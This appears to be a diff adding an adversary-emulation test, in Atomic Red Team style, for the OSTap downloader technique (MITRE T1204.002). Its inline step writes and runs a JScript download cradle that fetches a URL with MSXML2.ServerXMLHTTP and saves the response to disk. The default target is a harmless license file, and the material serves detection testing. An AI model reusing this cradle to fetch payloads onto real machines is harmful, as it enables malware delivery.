@@ -1,0 +1,32 @@
+api_version: "2.0"
+name: OSTap Payload Download
+description: |
+    Uses cscript //E:jscript to download a file
+args:
+    - name: script_file
+      type: path
+      default: '%TEMP%\OSTapGet.js'
+    - name: file_url
+      type: string
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+uuid: 3f3af983-118a-4fa1-85d3-ba4daa739d80
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1204: User Execution'
+    subtechniques:
+        - 'T1204.002: Malicious File'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: ostap-payload-download
+      inline: |
+        echo var url = "{{.Args.file_url}}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > {{.Args.script_file}}
+        cscript //E:Jscript {{.Args.script_file}}
+      executor: command_prompt
+      cleanup:
+        inline: |
+            del {{.Args.script_file}} /F /Q >nul 2>&1
+        executor: command_prompt
